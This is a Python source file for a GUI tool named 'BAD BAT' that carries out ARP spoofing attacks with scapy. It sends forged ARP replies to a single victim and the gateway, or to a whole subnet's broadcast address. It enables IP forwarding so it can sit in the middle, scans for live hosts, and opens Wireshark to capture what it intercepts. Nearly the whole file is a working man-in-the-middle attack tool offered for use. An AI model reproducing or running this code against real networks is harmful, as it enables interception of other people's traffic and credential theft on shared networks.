from tkinter import *
import scapy.all as scapy
import time
import os, sys
import ipaddress
from mac_vendor_lookup import MacLookup

window = Tk()
window.geometry("800x500")
window.config(bg="gray12")
window.title("BAD BAT 🦇 1.0")

#ENABLE IP FORWARDING 
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def wireshark():
    os.system("wireshark")


selectedinterface = None


#BACK BUTTON FUNCTION
def back():
    os.execv(sys.executable, ['python'] + sys.argv)


#GET THE MAC ADDRESSS
def get_mac(target_ip_mac):
    arp_packet = scapy.ARP(pdst=target_ip_mac)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combain_packet = broadcast / arp_packet
    result = scapy.srp(combain_packet, verbose=False, timeout=5)[0]
    return result[0][1].hwsrc

# ATTACK A SINGLE TARGET
def single_target():
    global l5, e1, e2, running
    running = True

    def spoof():
        global l11

        try:

            global returnpacket, packet
            target_ip = e1.get()
            spoof_ip = e2.get()
            target_mac = get_mac(target_ip)
            target_mac2 = get_mac(spoof_ip)
            #SENDING PACKET
            def packets():

                packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
                returnpacket = scapy.ARP(op=2, pdst=spoof_ip, hwdst=target_mac2, psrc=target_ip)
                if running:
                    scapy.send(packet, iface=selectedinterface)
                    scapy.send(returnpacket, iface=selectedinterface)
                    time.sleep(1)
                    window.after(50, spoof)

            l1 = Label(window, text="spoofing.......", fg="green", bg="gray12", font=("TRoman", 15))
            l1.place(x=230, y=70)
            packets()
            window.after(100, l1.destroy)




        except:
            l2 = Label(window, text="Enter a valid ip addresss", fg="red", bg="gray12", font=("TRoman", 10))
            l2.place(x=230, y=70)
            window.after(1000, l2.destroy)

    def stop():

        global running
        running = False
        l3 = Label(window, text="stoping.......", fg="red", bg="gray12", font=("TRoman", 15))
        l3.place(x=230, y=70)
        window.after(3000, l3.destroy)

    def start():
        global running
        running = True
        spoof()

    if selectedinterface == None:
        l4 = Label(text="Please select a interface", fg="red", bg="gray12", font=("TRoman", 10))
        l4.place(x=230, y=70)
        window.after(1000, l4.destroy)

    else:
        b10.destroy()
        b11.destroy()
        b12.destroy()
        l21.destroy()

        l5 = Label(text="𝘌𝘕𝘛𝘌𝘙 𝘛𝘈𝘙𝘎𝘌𝘛 𝘐𝘗", fg="gold", bg="gray12", font=("TRoman", 15))
        l5.place(x=100, y=130)
        l6 = Label(text="𝘌𝘕𝘛𝘌𝘙 𝘎𝘈𝘛𝘞𝘈𝘠 𝘐𝘗", fg="gold", bg="gray12", font=("Gungsuh", 15))
        l6.place(x=450, y=130)

        e1 = Entry(window)
        e1.place(x=101, y=180)
        e2 = Entry(window)
        e2.place(x=470, y=180)
#####################################
        b1 = Button(window, text="Wireshark", command=wireshark, bg="gold")
        b1.place(x=650, y=460)
        b2 = Button(text="SPOOF", bg="gold", command=start)
        b2.place(x=280, y=230)
        b3 = Button(text="STOP", bg="gold", command=stop, width=5)
        b3.place(x=385, y=230)
        b4 = Button(text="Back", command=back, fg="black", bg="gold")
        b4.place(x=560, y=460)

# ATTACK MULTIPLE TARGET 
def networkspoof():
    global running
    running = True
    if selectedinterface == None:
        l7 = Label(text="Please select a interface", fg="red", bg="gray12", font=("TRoman", 10))
        l7.place(x=230, y=70)
        window.after(1000, l7.destroy)


    else:
        b10.destroy()
        b11.destroy()
        b12.destroy()

        l21.destroy()
        # NETWORK MASK
        sublist = Listbox(width=20, height=3, bg="gray2", fg="gold", font=("bold", 14), selectmode=SINGLE)
        sublist.place(x=500, y=120)

        sublist.insert(END,
                       "255.0.0.0       /8",
                       "255.128.0.0     /9",
                       "255.192.0.0     /10",
                       "255.224.0.0     /11",
                       "255.240.0.0     /12",
                       "255.248.0.0     /13",
                       "255.252.0.0     /14",
                       "255.254.0.0     /15",
                       "255.255.0.0     /16",
                       "255.255.128.0   /17",
                       "255.255.192.0   /18",
                       "255.255.224.0   /19",
                       "255.255.240.0   /20",
                       "255.255.248.0   /21",
                       "255.255.252.0   /22",
                       "255.255.254.0   /23",
                       "255.255.255.0   /24",
                       "255.255.255.128 /25",
                       "255.255.255.224 /26",
                       "255.255.255.240 /27",
                       "255.255.255.248 /28",
                       "255.255.255.252 /29",
                       "255.255.255.254 /30",

                       )

        def subnetfun():
            try:
                gatwayip = e3.get()
                su = sublist.curselection()
                su = sublist.get(su)
                su = str(su[0:15]).replace(" ", "")

                ip = scapy.get_if_addr(selectedinterface)
                bcast = ipaddress.ip_network(ip + "/" + su, False)
                broadcastip = str(bcast.broadcast_address)

                gatwaymac = get_mac(gatwayip)

                if running == True:
                    send1 = scapy.ARP(op=2, pdst=broadcastip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gatwayip)
                    send2 = scapy.ARP(op=2, pdst=gatwayip, hwdst=gatwaymac, psrc=broadcastip)

                    scapy.send(send1, iface=selectedinterface)
                    scapy.send(send2, iface=selectedinterface)

                    l8 = Label(window, text="spoofing......", fg="green", bg="gray12", font=("TRoman", 15))
                    l8.place(x=260, y=50)
                    window.after(500, l8.destroy)
                    window.after(1000, subnetfun)
            except:
                l9 = Label(text="Please select all options correctly", fg="red", bg="gray12", font=("TRoman", 10))
                l9.place(x=230, y=70)
                window.after(500, l9.destroy)

        def stop():

            global running
            running = False
            l10 = Label(window, text="stoping........", fg="red", bg="gray12", font=("TRoman", 15))
            l10.place(x=260, y=50)
            window.after(2000, l10.destroy)

        def start():
            global running
            running = True
            subnetfun()

        l11 = Label(text="GATEWAY TARGET IP", fg="gold", bg="gray12", font=("Gungsuh", 15))
        l11.place(x=160, y=110)
        e3 = Entry(window)
        e3.place(x=180, y=170)
        b5 = Button(text="SPOOF", bg="gold", command=start)
        b5.place(x=315, y=230)
        b6 = Button(text="STOP", bg="gold", command=stop, width=5)
        b6.place(x=450, y=230)
        b7 = Button(window, text="Wireshark", command=wireshark, bg="gold")
        b7.place(x=650, y=460)
        b8 = Button(text="Back", command=back, fg="black", bg="gold")
        b8.place(x=560, y=460)


aliveip = []


def hostdiscover():
    global count, ip, l

    try:
        ip = str(scapy.get_if_addr(selectedinterface))
        l12 = Label(text="scanning.......", fg="green", bg="gray12", font=("TRoman", 15))
        l12.place(x=230, y=30)
        b10.destroy()
        b11.destroy()
        b12.destroy()
        l21.destroy()
        hostlist = Listbox(width=68, height=6, bg="gray2", fg="gold", font=("bold", 14), selectmode=SINGLE)
        hostlist.place(x=28, y=120)
        l13 = Label(text="𝘷𝘦𝘯𝘥𝘰𝘳", bg="gray12", fg="gold", font=("bold", 13))
        l13.place(x=475, y=80)
        l14 = Label(text="𝘔𝘢𝘤", bg="gray12", fg="gold", font=("bold", 13))
        l14.place(x=260, y=80)
        l15 = Label(text="𝘐𝘗", bg="gray12", fg="gold", font=("bold", 13))
        l15.place(x=70, y=80)
        b9 = Button(window, text="Wireshark", command=wireshark, bg="gold")
        b9.place(x=650, y=460)
        b111 = Button(text="Back", command=back, fg="black", bg="gold")
        b111.place(x=560, y=460)

        count = 0

        def hostscan():

            global count

            count += 1

            arp_packet = scapy.ARP(pdst=ip[0:10] + str(count))

            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            combain_packet = broadcast / arp_packet

            try:
                result = scapy.srp(combain_packet, verbose=False, timeout=0.1, iface=selectedinterface)[0]
                for i in result:

                    try:
                        result = i[1].psrc, "________", i[1].hwsrc, "________", MacLookup().lookup(i[1].hwsrc)
                    except:
                        result = i[1].psrc, "________", i[1].hwsrc, "________", "Not avilabile"

                    currentip = i[1].psrc

                    if currentip in aliveip:

                        pass
                    else:

                        aliveip.append(i[1].psrc)
                        hostlist.insert(END, result, "")



            except:
                l16 = Label(text="scanning.......", fg="green", bg="gray12", font=("TRoman", 15))
                l16.place(x=230, y=30)
                window.after(1000, l16.destroy())

            if count == 255:
                count = 0
                window.after(100, hostscan)

            else:
                window.after(100, hostscan)

        hostscan()



    except:
        l17 = Label(text="Please select a interface", fg="red", bg="gray12", font=("TRoman", 10))
        l17.place(x=230, y=70)
        window.after(500, l17.destroy)


b10 = Button(text="𝘏𝘖𝘚𝘛 𝘚𝘗𝘖𝘖𝘍", bg="gold", fg="black", font=("bold", 15), command=single_target, width=15)
b10.place(x=50, y=200)
b11 = Button(text="𝘕𝘌𝘛𝘞𝘖𝘙𝘒 𝘚𝘗𝘖𝘖𝘍", bg="gold", fg="black", font=("bold", 15), command=networkspoof)
b11.place(x=295, y=200)
b12 = Button(text="HOST DISCOVERY", bg="gold", fg="black", font=("bold", 15), command=hostdiscover)
b12.place(x=550, y=200)

iflist = Listbox(width=10, height=2, bg="black", fg="gold", font=("bold", 14), selectmode=SINGLE)
iflist.place(x=600, y=40)
intf = scapy.get_if_list()

for i in intf:
    iflist.insert(END, i)

# COLLECTING THE AVAILABLE INTERFACE
def interfacefun():
    global selectedinterface
    selectedinterface = iflist.curselection()
    selectedinterface = iflist.get(selectedinterface)
    l4 = Label(text=selectedinterface, fg="black", bg="gold", font=("bold", 14), width=10)
    l4.place(x=600, y=40)
    iflist.destroy()
    b13.destroy()
    l20.destroy()


b13 = Button(text="𝘚𝘌𝘓𝘌𝘊𝘛", command=interfacefun, fg="black", bg="gold")
b13.place(x=620, y=120)
l18 = Label(text="𝘐𝘕𝘛𝘌𝘙𝘍𝘈𝘊𝘌 : ", bg="gray12", fg="gold", font=("bold", 13))
l18.place(x=470, y=40)
l19 = Label(text="""ßÄÐ ßÄ†🦇""", bg="gray12", fg="gold", width=10, height=1, font=("bold", 70))
l19.place(x=160, y=300)
l20 = Label(text="🔽", bg="gray12", fg="goldenrod4", font=("bold", 13))
l20.place(x=720, y=50)
l21 = Label(text="""MADE BY
GREEJITH K
EMAIL :greejithmiui12@gmail.com
""", bg="gray12", fg="red", font=("bold", 7))
l21.place(x=635, y=455)

window.mainloop()




